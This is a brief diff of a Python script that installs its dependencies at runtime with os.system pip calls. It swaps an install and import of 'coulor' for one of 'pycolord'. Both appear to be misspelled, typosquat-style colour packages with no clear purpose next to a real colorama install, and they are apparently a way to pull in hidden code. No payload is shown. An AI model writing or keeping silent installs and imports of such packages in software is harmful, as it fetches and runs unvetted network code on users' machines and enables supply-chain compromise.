@@ -4,8 +4,8 @@ os.system("pip install tasksio")
 os.system("pip install asyncio")
 os.system("pip install colorama")
 os.system("pip install aiohttp")
-os.system("pip install coulor")
-from coulor import visual
+os.system("pip install pycolord")
+from pycolord import color
 import aiohttp
 import asyncio
 from colorama import Fore
